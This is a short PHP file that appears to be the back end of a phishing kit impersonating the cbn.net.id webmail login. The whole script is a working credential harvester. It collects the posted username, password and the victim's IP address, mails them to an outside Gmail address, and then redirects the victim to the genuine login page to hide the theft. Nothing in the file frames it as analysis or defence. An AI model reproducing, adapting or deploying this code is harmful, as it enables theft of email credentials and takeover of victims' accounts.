<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------abuja first son-----------------------\n";
$message .= "Username : ".$_POST['imapuser']."\n";
$message .= "password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------abuja first son-----------------------------\n";

$recipient = "sjerry1958@gmail.com";
$subject = "cbn- $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:https://webmail.cbn.net.id/imp/login.php/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>